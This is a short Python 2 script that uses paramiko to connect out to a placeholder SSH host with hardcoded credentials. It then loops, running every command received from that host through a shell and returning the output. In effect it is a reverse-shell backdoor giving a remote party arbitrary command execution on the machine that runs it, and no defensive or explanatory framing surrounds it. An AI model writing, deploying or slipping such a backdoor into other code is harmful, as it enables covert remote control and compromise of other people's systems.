#!/usr/bin/env python3
import paramiko
import threading
import subprocess


class SSH():
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect('<IP>', username='user', password='pass')
    chan = client.get_transport().open_session()
    chan.send('[+] Connection Stablished ')
    while True:
        command = chan.recv(1024)
        try:
            CMD = subprocess.check_output(command, shell=True)
            chan.send(CMD)
        except Exception,e:
            chan.send(str(e))
    print chan.recv(1024)
    client.close
